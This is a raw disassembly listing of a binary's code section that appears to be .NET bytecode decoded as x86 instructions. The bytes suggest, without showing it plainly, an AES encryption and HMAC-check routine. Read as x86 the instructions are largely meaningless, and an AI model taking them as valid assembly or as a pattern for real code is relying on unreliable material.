  40419f:	0a 73 d1             	or     -0x2f(%ebx),%dh
  4041a2:	00 00                	add    %al,(%eax)
  4041a4:	0a 0b                	or     (%ebx),%cl
  4041a6:	07                   	pop    %es
  4041a7:	20 00                	and    %al,(%eax)
  4041a9:	01 00                	add    %eax,(%eax)
  4041ab:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041ae:	00 00                	add    %al,(%eax)
  4041b0:	0a 07                	or     (%edi),%al
  4041b2:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b8:	d3 00                	roll   %cl,(%eax)
  4041ba:	00 0a                	add    %cl,(%edx)
  4041bc:	07                   	pop    %es
  4041bd:	17                   	pop    %ss
  4041be:	6f                   	outsl  %ds:(%esi),(%dx)
  4041bf:	d4 00                	aam    $0x0
  4041c1:	00 0a                	add    %cl,(%edx)
  4041c3:	07                   	pop    %es
  4041c4:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041c7:	00 00                	add    %al,(%eax)
  4041c9:	0a 07                	or     (%edi),%al
  4041cb:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041ce:	00 00                	add    %al,(%eax)
  4041d0:	04 6f                	add    $0x6f,%al
  4041d2:	d6                   	salc
  4041d3:	00 00                	add    %al,(%eax)
  4041d5:	0a 07                	or     (%edi),%al
  4041d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d8:	d7                   	xlat   %ds:(%ebx)
  4041d9:	00 00                	add    %al,(%eax)
  4041db:	0a 06                	or     (%esi),%al
  4041dd:	07                   	pop    %es
  4041de:	6f                   	outsl  %ds:(%esi),(%dx)
  4041df:	d8 00                	fadds  (%eax)
  4041e1:	00 0a                	add    %cl,(%edx)
  4041e3:	17                   	pop    %ss
  4041e4:	73 d9                	jae    0x4041bf
  4041e6:	00 00                	add    %al,(%eax)
  4041e8:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041eb:	07                   	pop    %es
  4041ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ed:	da 00                	fiaddl (%eax)
  4041ef:	00 0a                	add    %cl,(%edx)
  4041f1:	16                   	push   %ss
  4041f2:	07                   	pop    %es
  4041f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f4:	da 00                	fiaddl (%eax)
  4041f6:	00 0a                	add    %cl,(%edx)
  4041f8:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041fb:	4c                   	dec    %esp
  4041fc:	00 00                	add    %al,(%eax)
  4041fe:	0a 08                	or     (%eax),%cl
  404200:	03 16                	add    (%esi),%edx
  404202:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404208:	00 0a                	add    %cl,(%edx)
  40420a:	08 6f db             	or     %ch,-0x25(%edi)
  40420d:	00 00                	add    %al,(%eax)
  40420f:	0a 02                	or     (%edx),%al
  404211:	7b 2b                	jnp    0x40423e
  404213:	00 00                	add    %al,(%eax)
  404215:	04 73                	add    $0x73,%al
  404217:	dc 00                	faddl  (%eax)
  404219:	00 0a                	add    %cl,(%edx)
  40421b:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404220:	00 00                	add    %al,(%eax)
  404222:	0a 1f                	or     (%edi),%bl
  404224:	20 06                	and    %al,(%esi)
  404226:	6f                   	outsl  %ds:(%esi),(%dx)
  404227:	dd 00                	fldl   (%eax)
  404229:	00 0a                	add    %cl,(%edx)
  40422b:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40422e:	20 59 6f             	and    %bl,0x6f(%ecx)
  404231:	de 00                	fiadds (%eax)
  404233:	00 0a                	add    %cl,(%edx)
  404235:	13 04 06             	adc    (%esi,%eax,1),%eax
  404238:	16                   	push   %ss
  404239:	6a 6f                	push   $0x6f
  40423b:	4e                   	dec    %esi
  40423c:	00 00                	add    %al,(%eax)
  40423e:	0a 06                	or     (%esi),%al
  404240:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404243:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404246:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  40424d:	27                   	daa
  40424e:	00 00                	add    %al,(%eax)
  404250:	00 09                	add    %cl,(%ecx)
  404252:	39 06                	cmp    %eax,(%esi)
  404254:	00 00                	add    %al,(%eax)
  404256:	00 09                	add    %cl,(%ecx)
  404258:	6f                   	outsl  %ds:(%esi),(%dx)
  404259:	33 00                	xor    (%eax),%eax
  40425b:	00 0a                	add    %cl,(%edx)
  40425d:	dc 08                	fmull  (%eax)
  40425f:	39 06                	cmp    %eax,(%esi)
  404261:	00 00                	add    %al,(%eax)
  404263:	00 08                	add    %cl,(%eax)
  404265:	6f                   	outsl  %ds:(%esi),(%dx)
  404266:	33 00                	xor    (%eax),%eax
  404268:	00 0a                	add    %cl,(%edx)
  40426a:	dc 07                	faddl  (%edi)
  40426c:	39 06                	cmp    %eax,(%esi)
  40426e:	00 00                	add    %al,(%eax)
  404270:	00 07                	add    %al,(%edi)
  404272:	6f                   	outsl  %ds:(%esi),(%dx)
  404273:	33 00                	xor    (%eax),%eax
  404275:	00 0a                	add    %cl,(%edx)
  404277:	dc 06                	faddl  (%esi)
  404279:	6f                   	outsl  %ds:(%esi),(%dx)
  40427a:	dd 00                	fldl   (%eax)
  40427c:	00 0a                	add    %cl,(%edx)
  40427e:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  404284:	00 06                	add    %al,(%esi)
  404286:	39 06                	cmp    %eax,(%esi)
  404288:	00 00                	add    %al,(%eax)
  40428a:	00 06                	add    %al,(%esi)
  40428c:	6f                   	outsl  %ds:(%esi),(%dx)
  40428d:	33 00                	xor    (%eax),%eax
  40428f:	00 0a                	add    %cl,(%edx)
  404291:	dc 11                	fcoml  (%ecx)
  404293:	05 2a 00 00 00       	add    $0x2a,%eax
  404298:	01 34 00             	add    %esi,(%eax,%eax,1)
  40429b:	00 02                	add    %al,(%edx)
  40429d:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  4042a4:	00 00                	add    %al,(%eax)
  4042a6:	00 00                	add    %al,(%eax)
  4042a8:	02 00                	add    (%eax),%al
  4042aa:	6a 00                	push   $0x0
  4042ac:	74 de                	je     0x40428c
  4042ae:	00 0d 00 00 00 00    	add    %cl,0x0
  4042b4:	02 00                	add    (%eax),%al
  4042b6:	26 00 c5             	es add %al,%ch
  4042b9:	eb 00                	jmp    0x4042bb
  4042bb:	0d 00 00 00 00       	or     $0x0,%eax
  4042c0:	02 00                	add    (%eax),%al
  4042c2:	17                   	pop    %ss
  4042c3:	00 ee                	add    %ch,%dh
  4042c5:	05 01 0d 00 00       	add    $0xd01,%eax
  4042ca:	00 00                	add    %al,(%eax)
  4042cc:	1b 30                	sbb    (%eax),%esi
  4042ce:	05 00 50 01 00       	add    $0x15000,%eax
  4042d3:	00 17                	add    %dl,(%edi)
  4042d5:	00 00                	add    %al,(%eax)
  4042d7:	11 03                	adc    %eax,(%ebx)
  4042d9:	3a 0b                	cmp    (%ebx),%cl
  4042db:	00 00                	add    %al,(%eax)
  4042dd:	00 72 ac             	add    %dh,-0x54(%edx)
  4042e0:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  4042e4:	cf                   	iret
  4042e5:	00 00                	add    %al,(%eax)
  4042e7:	0a 7a 03             	or     0x3(%edx),%bh
  4042ea:	73 4d                	jae    0x404339
  4042ec:	00 00                	add    %al,(%eax)
  4042ee:	0a 0a                	or     (%edx),%cl
  4042f0:	73 d1                	jae    0x4042c3
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	0a 0b                	or     (%ebx),%cl
  4042f6:	07                   	pop    %es
  4042f7:	20 00                	and    %al,(%eax)
  4042f9:	01 00                	add    %eax,(%eax)
  4042fb:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042fe:	00 00                	add    %al,(%eax)
  404300:	0a 07                	or     (%edi),%al
  404302:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404308:	d3 00                	roll   %cl,(%eax)
  40430a:	00 0a                	add    %cl,(%edx)
  40430c:	07                   	pop    %es
  40430d:	17                   	pop    %ss
  40430e:	6f                   	outsl  %ds:(%esi),(%dx)
  40430f:	d4 00                	aam    $0x0
  404311:	00 0a                	add    %cl,(%edx)
  404313:	07                   	pop    %es
  404314:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  404317:	00 00                	add    %al,(%eax)
  404319:	0a 07                	or     (%edi),%al
  40431b:	02 7b 2a             	add    0x2a(%ebx),%bh
  40431e:	00 00                	add    %al,(%eax)
  404320:	04 6f                	add    $0x6f,%al
  404322:	d6                   	salc
  404323:	00 00                	add    %al,(%eax)
  404325:	0a 02                	or     (%edx),%al
  404327:	7b 2b                	jnp    0x404354
  404329:	00 00                	add    %al,(%eax)
  40432b:	04 73                	add    $0x73,%al
  40432d:	dc 00                	faddl  (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	0c 08                	or     $0x8,%al
  404333:	06                   	push   %es
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	1f                   	pop    %ds
  40433a:	20 06                	and    %al,(%esi)
  40433c:	6f                   	outsl  %ds:(%esi),(%dx)
  40433d:	dd 00                	fldl   (%eax)
  40433f:	00 0a                	add    %cl,(%edx)
  404341:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404344:	20 59 6f             	and    %bl,0x6f(%ecx)
  404347:	de 00                	fiadds (%eax)
  404349:	00 0a                	add    %cl,(%edx)
  40434b:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404350:	00 00                	add    %al,(%eax)
  404352:	01 13                	add    %edx,(%ebx)
  404354:	04 06                	add    $0x6,%al
  404356:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404359:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40435c:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404363:	02 09                	add    (%ecx),%cl
  404365:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404368:	50                   	push   %eax
  404369:	00 00                	add    %al,(%eax)
  40436b:	06                   	push   %es
  40436c:	3a 0b                	cmp    (%ebx),%cl
  40436e:	00 00                	add    %al,(%eax)
  404370:	00 72 da             	add    %dh,-0x26(%edx)
  404373:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404377:	df 00                	filds  (%eax)
  404379:	00 0a                	add    %cl,(%edx)
  40437b:	7a dd                	jp     0x40435a
  40437d:	0d 00 00 00 08       	or     $0x8000000,%eax
  404382:	39 06                	cmp    %eax,(%esi)
  404384:	00 00                	add    %al,(%eax)
  404386:	00 08                	add    %cl,(%eax)
  404388:	6f                   	outsl  %ds:(%esi),(%dx)
  404389:	33 00                	xor    (%eax),%eax
  40438b:	00 0a                	add    %cl,(%edx)
  40438d:	dc 1f                	fcompl (%edi)
  40438f:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  404395:	13 05 06 11 05 16    	adc    0x16051106,%eax
  40439b:	1f                   	pop    %ds
  40439c:	10 6f 45             	adc    %ch,0x45(%edi)
  40439f:	00 00                	add    %al,(%eax)
  4043a1:	0a 26                	or     (%esi),%ah
  4043a3:	07                   	pop    %es
  4043a4:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043aa:	0a 06                	or     (%esi),%al
  4043ac:	07                   	pop    %es
  4043ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4043ae:	e1 00                	loope  0x4043b0
  4043b0:	00 0a                	add    %cl,(%edx)
  4043b2:	16                   	push   %ss
  4043b3:	73 d9                	jae    0x40438e
  4043b5:	00 00                	add    %al,(%eax)
  4043b7:	0a 13                	or     (%ebx),%dl
  4043b9:	06                   	push   %es
  4043ba:	06                   	push   %es
  4043bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4043bc:	e2 00                	loop   0x4043be
  4043be:	00 0a                	add    %cl,(%edx)
  4043c0:	1f                   	pop    %ds
  4043c1:	10 6a 59             	adc    %ch,0x59(%edx)
  4043c4:	17                   	pop    %ss
  4043c5:	6a 58                	push   $0x58
  4043c7:	d4 8d                	aam    $0x8d
  4043c9:	44                   	inc    %esp
  4043ca:	00 00                	add    %al,(%eax)
  4043cc:	01 13                	add    %edx,(%ebx)
  4043ce:	07                   	pop    %es
  4043cf:	11 06                	adc    %eax,(%esi)
  4043d1:	11 07                	adc    %eax,(%edi)
  4043d3:	16                   	push   %ss
  4043d4:	11 07                	adc    %eax,(%edi)
  4043d6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d9:	45                   	inc    %ebp
  4043da:	00 00                	add    %al,(%eax)
  4043dc:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043e2:	13 08                	adc    (%eax),%ecx
  4043e4:	11 07                	adc    %eax,(%edi)
  4043e6:	16                   	push   %ss
  4043e7:	11 08                	adc    %ecx,(%eax)
  4043e9:	16                   	push   %ss
  4043ea:	11 08                	adc    %ecx,(%eax)
  4043ec:	8e 69 28             	mov    0x28(%ecx),%gs
  4043ef:	e3 00                	jecxz  0x4043f1
  4043f1:	00 0a                	add    %cl,(%edx)
  4043f3:	11 08                	adc    %ecx,(%eax)
  4043f5:	13 09                	adc    (%ecx),%ecx
  4043f7:	dd 29                	(bad) (%ecx)
  4043f9:	00 00                	add    %al,(%eax)
  4043fb:	00 11                	add    %dl,(%ecx)
  4043fd:	06                   	push   %es
  4043fe:	39 07                	cmp    %eax,(%edi)
  404400:	00 00                	add    %al,(%eax)
  404402:	00 11                	add    %dl,(%ecx)
  404404:	06                   	push   %es
  404405:	6f                   	outsl  %ds:(%esi),(%dx)
  404406:	33 00                	xor    (%eax),%eax
  404408:	00 0a                	add    %cl,(%edx)
  40440a:	dc 07                	faddl  (%edi)
  40440c:	39 06                	cmp    %eax,(%esi)
  40440e:	00 00                	add    %al,(%eax)
  404410:	00 07                	add    %al,(%edi)
  404412:	6f                   	outsl  %ds:(%esi),(%dx)
  404413:	33 00                	xor    (%eax),%eax
  404415:	00 0a                	add    %cl,(%edx)
  404417:	dc 06                	faddl  (%esi)
  404419:	39 06                	cmp    %eax,(%esi)
  40441b:	00 00                	add    %al,(%eax)
  40441d:	00 06                	add    %al,(%esi)
  40441f:	6f                   	outsl  %ds:(%esi),(%dx)
  404420:	33 00                	xor    (%eax),%eax
  404422:	00 0a                	add    %cl,(%edx)
  404424:	dc 11                	fcoml  (%ecx)
  404426:	09 2a                	or     %ebp,(%edx)
  404428:	41                   	inc    %ecx
  404429:	64 00 00             	add    %al,%fs:(%eax)
  40442c:	02 00                	add    (%eax),%al
  40442e:	00 00                	add    %al,(%eax)
  404430:	5a                   	pop    %edx
  404431:	00 00                	add    %al,(%eax)
  404433:	00 4f 00             	add    %cl,0x0(%edi)
  404436:	00 00                	add    %al,(%eax)
  404438:	a9 00 00 00 0d       	test   $0xd000000,%eax
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 00                	add    %al,(%eax)
  404441:	00 00                	add    %al,(%eax)
  404443:	00 02                	add    %al,(%edx)
  404445:	00 00                	add    %al,(%eax)
  404447:	00 e2                	add    %ah,%dl
  404449:	00 00                	add    %al,(%eax)
  40444b:	00 42 00             	add    %al,0x0(%edx)
  40444e:	00 00                	add    %al,(%eax)
  404450:	24 01                	and    $0x1,%al
  404452:	00 00                	add    %al,(%eax)
  404454:	0f 00 00             	sldt   (%eax)
  404457:	00 00                	add    %al,(%eax)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 02                	add    %al,(%edx)
  40445d:	00 00                	add    %al,(%eax)
  40445f:	00 1e                	add    %bl,(%esi)
  404461:	00 00                	add    %al,(%eax)
  404463:	00 15 01 00 00 33    	add    %dl,0x33000001
  404469:	01 00                	add    %eax,(%eax)
  40446b:	00 0d 00 00 00 00    	add    %cl,0x0
  404471:	00 00                	add    %al,(%eax)
  404473:	00 02                	add    %al,(%edx)
  404475:	00 00                	add    %al,(%eax)
  404477:	00 18                	add    %bl,(%eax)
  404479:	00 00                	add    %al,(%eax)
  40447b:	00 28                	add    %ch,(%eax)
  40447d:	01 00                	add    %eax,(%eax)
  40447f:	00 40 01             	add    %al,0x1(%eax)
  404482:	00 00                	add    %al,(%eax)
  404484:	0d 00 00 00 00       	or     $0x0,%eax
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 13                	add    %dl,(%ebx)
  40448d:	30 03                	xor    %al,(%ebx)
  40448f:	00 22                	add    %ah,(%edx)
  404491:	00 00                	add    %al,(%eax)
  404493:	00 18                	add    %bl,(%eax)
  404495:	00 00                	add    %al,(%eax)
  404497:	11 17                	adc    %edx,(%edi)
  404499:	0a 16                	or     (%esi),%dl
  40449b:	0b 38                	or     (%eax),%edi
  40449d:	11 00                	adc    %eax,(%eax)
  40449f:	00 00                	add    %al,(%eax)
  4044a1:	03 07                	add    (%edi),%eax
  4044a3:	91                   	xchg   %eax,%ecx
  4044a4:	04 07                	add    $0x7,%al
  4044a6:	91                   	xchg   %eax,%ecx
  4044a7:	3b 02                	cmp    (%edx),%eax
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	00 16                	add    %dl,(%esi)
  4044ad:	0a 07                	or     (%edi),%al
  4044af:	17                   	pop    %ss
  4044b0:	58                   	pop    %eax
  4044b1:	0b 07                	or     (%edi),%eax
  4044b3:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b9:	2a 00                	sub    (%eax),%al
  4044bb:	00 1b                	add    %bl,(%ebx)
  4044bd:	30 03                	xor    %al,(%ebx)
  4044bf:	00 6e 00             	add    %ch,0x0(%esi)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	19 00                	sbb    %eax,(%eax)
  4044c6:	00 11                	add    %dl,(%ecx)
  4044c8:	28 19                	sub    %bl,(%ecx)
  4044ca:	00 00                	add    %al,(%eax)
  4044cc:	0a 02                	or     (%edx),%al
  4044ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4044cf:	1f                   	pop    %ds
  4044d0:	00 00                	add    %al,(%eax)
  4044d2:	0a 0a                	or     (%edx),%cl
  4044d4:	73 e5                	jae    0x4044bb
  4044d6:	00 00                	add    %al,(%eax)
  4044d8:	0a 0b                	or     (%ebx),%cl
  4044da:	07                   	pop    %es
  4044db:	06                   	push   %es
  4044dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4044dd:	8f 00                	pop    (%eax)
  4044df:	00 0a                	add    %cl,(%edx)
  4044e1:	0a dd                	or     %ch,%bl
  4044e3:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e8:	39 06                	cmp    %eax,(%esi)
  4044ea:	00 00                	add    %al,(%eax)
  4044ec:	00 07                	add    %al,(%edi)
  4044ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4044ef:	33 00                	xor    (%eax),%eax
  4044f1:	00 0a                	add    %cl,(%edx)
  4044f3:	dc 73 90             	fdivl  -0x70(%ebx)
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044fb:	0d 16 13 04 38       	or     $0x38041316,%eax
  404500:	1f                   	pop    %ds
  404501:	00 00                	add    %al,(%eax)
  404503:	00 09                	add    %cl,(%ecx)
  404505:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404508:	13 05 08 12 05 72    	adc    0x72051208,%eax
  40450e:	30 27                	xor    %ah,(%edi)
  404510:	00 70 28             	add    %dh,0x28(%eax)
  404513:	91                   	xchg   %eax,%ecx
  404514:	00 00                	add    %al,(%eax)
  404516:	0a 6f 92             	or     -0x6e(%edi),%ch
  404519:	00 00                	add    %al,(%eax)
  40451b:	0a 26                	or     (%esi),%ah
  40451d:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404520:	58                   	pop    %eax
  404521:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404524:	04 09                	add    $0x9,%al
  404526:	8e 69 32             	mov    0x32(%ecx),%gs
  404529:	da 08                	fimull (%eax)
  40452b:	6f                   	outsl  %ds:(%esi),(%dx)
  40452c:	38 00                	cmp    %al,(%eax)
  40452e:	00 0a                	add    %cl,(%edx)
  404530:	6f                   	outsl  %ds:(%esi),(%dx)
  404531:	94                   	xchg   %eax,%esp
  404532:	00 00                	add    %al,(%eax)
  404534:	0a 2a                	or     (%edx),%ch
  404536:	00 00                	add    %al,(%eax)
  404538:	01 10                	add    %edx,(%eax)
  40453a:	00 00                	add    %al,(%eax)
  40453c:	02 00                	add    (%eax),%al
  40453e:	12 00                	adc    (%eax),%al
  404540:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1b                	add    %bl,(%ebx)
  404549:	30 02                	xor    %al,(%edx)
  40454b:	00 22                	add    %ah,(%edx)
  40454d:	00 00                	add    %al,(%eax)
  40454f:	00 1a                	add    %bl,(%edx)
  404551:	00 00                	add    %al,(%eax)
  404553:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0a                	or     (%edx),%cl
  40455a:	06                   	push   %es
  40455b:	02 6f 8f             	add    -0x71(%edi),%ch
  40455e:	00 00                	add    %al,(%eax)
  404560:	0a 0b                	or     (%ebx),%cl
  404562:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404568:	39 06                	cmp    %eax,(%esi)
  40456a:	00 00                	add    %al,(%eax)
  40456c:	00 06                	add    %al,(%esi)
  40456e:	6f                   	outsl  %ds:(%esi),(%dx)
  40456f:	33 00                	xor    (%eax),%eax
  404571:	00 0a                	add    %cl,(%edx)
  404573:	dc 07                	faddl  (%edi)
  404575:	2a 00                	sub    (%eax),%al
  404577:	00 01                	add    %al,(%ecx)
  404579:	10 00                	adc    %al,(%eax)
  40457b:	00 02                	add    %al,(%edx)
  40457d:	00 06                	add    %al,(%esi)
  40457f:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  404585:	00 00                	add    %al,(%eax)
  404587:	00 13                	add    %dl,(%ebx)
  404589:	30 03                	xor    %al,(%ebx)
  40458b:	00 3b                	add    %bh,(%ebx)
  40458d:	00 00                	add    %al,(%eax)
  40458f:	00 1b                	add    %bl,(%ebx)
  404591:	00 00                	add    %al,(%eax)
  404593:	11 73 90             	adc    %esi,-0x70(%ebx)
  404596:	00 00                	add    %al,(%eax)
  404598:	0a 0a                	or     (%edx),%cl
  40459a:	02 0b                	add    (%ebx),%cl
  40459c:	16                   	push   %ss
  40459d:	0c 38                	or     $0x38,%al
  40459f:	1f                   	pop    %ds
  4045a0:	00 00                	add    %al,(%eax)
  4045a2:	00 07                	add    %al,(%edi)
  4045a4:	08 91 0d 06 72 36    	or     %dl,0x3672060d(%ecx)
  4045aa:	27                   	daa
  4045ab:	00 70 09             	add    %dh,0x9(%eax)
  4045ae:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045b2:	01 28                	add    %ebp,(%eax)
  4045b4:	e6 00                	out    %al,$0x0
  4045b6:	00 0a                	add    %cl,(%edx)
  4045b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b9:	92                   	xchg   %eax,%edx
  4045ba:	00 00                	add    %al,(%eax)
  4045bc:	0a 26                	or     (%esi),%ah
  4045be:	08 17                	or     %dl,(%edi)
  4045c0:	58                   	pop    %eax
  4045c1:	0c 08                	or     $0x8,%al
  4045c3:	07                   	pop    %es
  4045c4:	8e 69 32             	mov    0x32(%ecx),%gs
  4045c7:	db 06                	fildl  (%esi)
  4045c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ca:	38 00                	cmp    %al,(%eax)
  4045cc:	00 0a                	add    %cl,(%edx)
  4045ce:	2a 00                	sub    (%eax),%al
  4045d0:	13 30                	adc    (%eax),%esi
  4045d2:	03 00                	add    (%eax),%eax
  4045d4:	3b 00                	cmp    (%eax),%eax
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	1b 00                	sbb    (%eax),%eax
  4045da:	00 11                	add    %dl,(%ecx)
  4045dc:	73 90                	jae    0x40456e
  4045de:	00 00                	add    %al,(%eax)
  4045e0:	0a 0a                	or     (%edx),%cl
  4045e2:	02 0b                	add    (%ebx),%cl
  4045e4:	16                   	push   %ss
  4045e5:	0c 38                	or     $0x38,%al
  4045e7:	1f                   	pop    %ds
  4045e8:	00 00                	add    %al,(%eax)
  4045ea:	00 07                	add    %al,(%edi)
  4045ec:	08 91 0d 06 72 46    	or     %dl,0x4672060d(%ecx)
  4045f2:	27                   	daa
  4045f3:	00 70 09             	add    %dh,0x9(%eax)
  4045f6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045fa:	01 28                	add    %ebp,(%eax)
  4045fc:	e6 00                	out    %al,$0x0
  4045fe:	00 0a                	add    %cl,(%edx)
  404600:	6f                   	outsl  %ds:(%esi),(%dx)
  404601:	92                   	xchg   %eax,%edx
  404602:	00 00                	add    %al,(%eax)
  404604:	0a 26                	or     (%esi),%ah
  404606:	08 17                	or     %dl,(%edi)
  404608:	58                   	pop    %eax
  404609:	0c 08                	or     $0x8,%al
  40460b:	07                   	pop    %es
  40460c:	8e 69 32             	mov    0x32(%ecx),%gs
  40460f:	db 06                	fildl  (%esi)
  404611:	6f                   	outsl  %ds:(%esi),(%dx)
  404612:	38 00                	cmp    %al,(%eax)
  404614:	00 0a                	add    %cl,(%edx)
  404616:	2a 00                	sub    (%eax),%al
  404618:	13 30                	adc    (%eax),%esi
  40461a:	04 00                	add    $0x0,%al
  40461c:	2c 00                	sub    $0x0,%al
  40461e:	00 00                	add    %al,(%eax)
  404620:	1c 00                	sbb    $0x0,%al
  404622:	00 11                	add    %dl,(%ecx)
  404624:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  40462a:	00 01                	add    %al,(%ecx)
  40462c:	0a 02                	or     (%edx),%al
  40462e:	8e 69 17             	mov    0x17(%ecx),%gs
  404631:	59                   	pop    %ecx
  404632:	0b 16                	or     (%esi),%edx
  404634:	0c 38                	or     $0x38,%al
  404636:	0e                   	push   %cs
  404637:	00 00                	add    %al,(%eax)
  404639:	00 06                	add    %al,(%esi)
  40463b:	08 02                	or     %al,(%edx)
  40463d:	07                   	pop    %es
  40463e:	91                   	xchg   %eax,%ecx
  40463f:	9c                   	pushf
  404640:	07                   	pop    %es
  404641:	17                   	pop    %ss
  404642:	59                   	pop    %ecx
  404643:	0b 08                	or     (%eax),%ecx
  404645:	17                   	pop    %ss
  404646:	58                   	pop    %eax
  404647:	0c 08                	or     $0x8,%al
  404649:	06                   	push   %es
  40464a:	8e 69 32             	mov    0x32(%ecx),%gs
  40464d:	ec                   	in     (%dx),%al
  40464e:	06                   	push   %es
  40464f:	2a 13                	sub    (%ebx),%dl
  404651:	30 02                	xor    %al,(%edx)
  404653:	00 36                	add    %dh,(%esi)
  404655:	00 00                	add    %al,(%eax)
  404657:	00 01                	add    %al,(%ecx)
  404659:	00 00                	add    %al,(%eax)
  40465b:	11 16                	adc    %edx,(%esi)
  40465d:	0a 38                	or     (%eax),%bh
  40465f:	15 00 00 00 02       	adc    $0x2000000,%eax
  404664:	7b 38                	jnp    0x40469e
  404666:	00 00                	add    %al,(%eax)
  404668:	04 06                	add    $0x6,%al
  40466a:	6f                   	outsl  %ds:(%esi),(%dx)
  40466b:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  404672:	00 06                	add    %al,(%esi)
  404674:	06                   	push   %es
  404675:	17                   	pop    %ss
  404676:	58                   	pop    %eax
  404677:	0a 06                	or     (%esi),%al
  404679:	02 7b 38             	add    0x38(%ebx),%bh
  40467c:	00 00                	add    %al,(%eax)
  40467e:	04 6f                	add    $0x6f,%al
  404680:	eb 00                	jmp    0x404682
  404682:	00 0a                	add    %cl,(%edx)
  404684:	32 dd                	xor    %ch,%bl
  404686:	02 7b 38             	add    0x38(%ebx),%bh
  404689:	00 00                	add    %al,(%eax)
  40468b:	04 6f                	add    $0x6f,%al
  40468d:	ec                   	in     (%dx),%al
  40468e:	00 00                	add    %al,(%eax)
  404690:	0a 2a                	or     (%edx),%ch
  404692:	00 00                	add    %al,(%eax)
  404694:	13 30                	adc    (%eax),%esi
  404696:	02 00                	add    (%eax),%al
  404698:	1b 00                	sbb    (%eax),%eax
  40469a:	00 00                	add    %al,(%eax)
  40469c:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  4046a1:	94                   	xchg   %eax,%esp
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	06                   	push   %es
  4046a5:	0a 06                	or     (%esi),%al
  4046a7:	02 7d 37             	add    0x37(%ebp),%bh
  4046aa:	00 00                	add    %al,(%eax)
  4046ac:	04 02                	add    $0x2,%al
  4046ae:	7b 38                	jnp    0x4046e8
  4046b0:	00 00                	add    %al,(%eax)
  4046b2:	04 06                	add    $0x6,%al
  4046b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b5:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046ba:	2a 00                	sub    (%eax),%al
  4046bc:	1b 30                	sbb    (%eax),%esi
  4046be:	02 00                	add    (%eax),%al
  4046c0:	60                   	pusha
  4046c1:	00 00                	add    %al,(%eax)
  4046c3:	00 1e                	add    %bl,(%esi)
  4046c5:	00 00                	add    %al,(%eax)
  4046c7:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ce:	7d 00                	jge    0x4046d0
  4046d0:	00 0a                	add    %cl,(%edx)
  4046d2:	0c 02                	or     $0x2,%al
  4046d4:	7b 38                	jnp    0x40470e
  4046d6:	00 00                	add    %al,(%eax)
  4046d8:	04 6f                	add    $0x6f,%al
  4046da:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
